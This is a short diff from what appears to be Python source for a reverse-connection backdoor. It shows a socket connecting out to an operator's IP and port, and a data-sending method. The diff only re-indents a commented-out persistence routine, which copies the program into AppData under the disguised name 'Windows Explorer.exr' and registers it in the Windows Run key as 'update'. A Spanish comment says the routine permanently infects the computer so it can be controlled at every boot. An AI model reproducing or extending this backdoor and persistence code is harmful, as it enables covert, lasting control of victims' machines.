@@ -11,12 +11,12 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
-    #este proceso hace que la computadora con Windows se infecte de forma permanente, y cada que encienda la computadora tener control sobre ella.
+#    este proceso hace que la computadora con Windows se infecte de forma permanente, y cada que encienda la computadora tener control sobre ella.
 #    def become_persistent(self):
- #       evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exr"
-  #      if not os.path.exists(evil_file_location):
-   #         shutil.copyfile(sys.executable, evil_file_location)
-    #        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+#        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exr"
+#        if not os.path.exists(evil_file_location):
+#            shutil.copyfile(sys.executable, evil_file_location)
+#            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
         
     def reliable_send(self, data):
         json_data = json.dumps(data)
